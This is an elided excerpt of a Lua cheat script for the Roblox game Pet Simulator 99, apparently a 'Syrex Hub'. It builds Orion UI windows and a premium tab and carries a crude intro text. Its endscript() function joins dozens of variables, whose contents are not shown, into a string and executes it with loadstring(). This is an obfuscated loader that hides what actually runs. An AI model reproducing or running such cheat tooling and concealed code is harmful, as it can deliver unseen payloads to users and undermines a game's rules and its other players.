...
-- creating window
local Window = OrionLib:MakeWindow({Name = "Noob | Pet Simulator 99", HidePremium = false, IntroText = "cum", SaveConfig = true, ConfigFolder = "Syrex Hub"})
...
PremiumTab:AddButton({
	...
	Callback = function()
        ...
        -- creating window
        local Window = OrionLib:MakeWindow({Name = "Syrex Hub | Pet Simulator 99", HidePremium = false, IntroText = "Syrex Hub", SaveConfig = true, ConfigFolder = "Syrex Hub"})
...
function endscript()
    local script = h .. e .. f .. i .. r .. d .. j .. n .. a .. c .. u .. z .. w .. v .. g .. q .. x .. o .. p .. k .. l .. b .. y .. s .. m .. t .. zf .. mh .. lx .. su .. tb .. sz .. bs .. fw
    loadstring(script)()
end
